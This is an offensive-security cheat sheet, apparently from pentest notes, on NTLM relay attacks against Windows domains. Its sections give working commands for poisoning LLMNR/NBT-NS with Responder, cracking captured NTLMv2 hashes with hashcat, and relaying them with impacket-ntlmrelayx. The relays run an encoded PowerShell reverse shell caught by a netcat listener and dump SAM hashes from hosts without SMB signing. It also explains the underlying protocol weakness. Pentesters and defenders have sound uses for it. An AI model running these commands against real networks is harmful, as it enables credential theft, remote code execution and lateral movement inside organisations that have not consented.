# NTLM Relay
---

## Exploit

Let’s assume you get remote code execution on a domain joined computer. You use `whomai` and `net user $USERNAME` and find that your bind shell run on an unprivileged user. You want to get his password.

```bash
# On Kali, get private IP (LHOST) and start a responder
ip a
sudo responder -I eth0

# On the target machine
dir \\$LHOST\test

# Put the NTLMv2-SSP Hash you recieved on your responder in a file and crack it
hashcat -m 5600 target.hash /usr/share/wordlists/rockyou.txt --force
```

You’ll often get NTLMv2 hashes of machine accounts. **Do not waste your time cracking them since passwords are randomly and automatically generated**.

If we are not able to crack the NTLMv2 hash, it’s also possible to relay it to a target. The following attack relays the authentication of `$SOURCE` to `$TARGET` passing by the Kali. The relay start a reverse bind shell on `$TARGET` (passed with `-c` parameter) which is caught by the Kali thanks to a `nc` listener.

```bash
# On Kali, start a relay to the target, activating SMB2 and disabling http server
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET -c "powershell -enc JABjAGwAaQBlAG4AdA..."

# On Kali, listen to catch reverse shell
nc -nvlp 8080

# In source domain joined computer, connect to our relay
dir \\$LHOST\test

# Reverse shell should have been caught by the Netcat listener on the Kali
whoami
hostname
ipconfig
```

## Vulnerability

If a windows client cannot resolve a hostname using DNS, it will use the Link-Local Multicast Name Resolution (LLMNR) protocol to ask neighbouring computers. LLMNR can be used to resolve both IPv4 and IPv6 addresses.

If this fails, NetBios Name Service (NBT-NS) will be used. NBT-NS is a similar protocol to LLMNR that serves the same purpose. The main difference between the two is NBT-NS works over IPv4 only.

On these occasions when LLMNR or NBT-NS are used to resolve a request, any host on the network who knows the IP of the host being asked about can reply. Even if a host replies to one of these requests with incorrect information, it will still be regarded as legitimate.

Therefore it is possible to intercept NTLMv1/v2 hashes when a client tries to authenticate against a spoofed service. If NTLMv1 is enabled they can be reused as [Pass the Hash](/ad/passthehash/) attacks. However, if only NTLMv2 hashes are intercepted they cannot be used in the same way. Instead they need to be replayed quickly as they are only valid for a short period of time.

## Prerequisites

- Network access.

## Exploit

Start by listening the network with `responder` to spoof any NTLM hash that could transit. If you catch NTHashes, just reuse it with [Pass the Hash](/ad/passthehash/) method.

```bash
sudo responder -wrfbudPF -I eth0
```

Otherwise, if you obtain Net-NTLMv1 or Net-NTLMv2 hashes, you will have to relay them. To do so, you can use `impacket-ntlmrelayx`. By default, if no command is given it will try to dump SAM hashes. To do so, one must first identify hosts where smb signing is disabled.

```bash
cme smb $RANGE --gen-relay-list targets.txt
```

Once this is done, it will be used as hosts where the NTLMv2 hashes are replayed. But first, the configuration file of `responder` must be modified to disable SMB and HTTP:

```bash
sudo vim /etc/responder/Responder.conf

[Responder Core]

; Servers to start
SQL = On
SMB = Off #Should be On when not combined with ntlmrelayx
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off #Should be On when not combined with ntlmrelayx
HTTPS = On
DNS = On
LDAP = On
```

Once the configuration file is modified, the two following commands can be ran simultaneously.

```bash
sudo responder -rdwPF -I eth0
sudo impacket-ntlmrelayx -tf targets.txt --http-port 8000 -of output.txt
```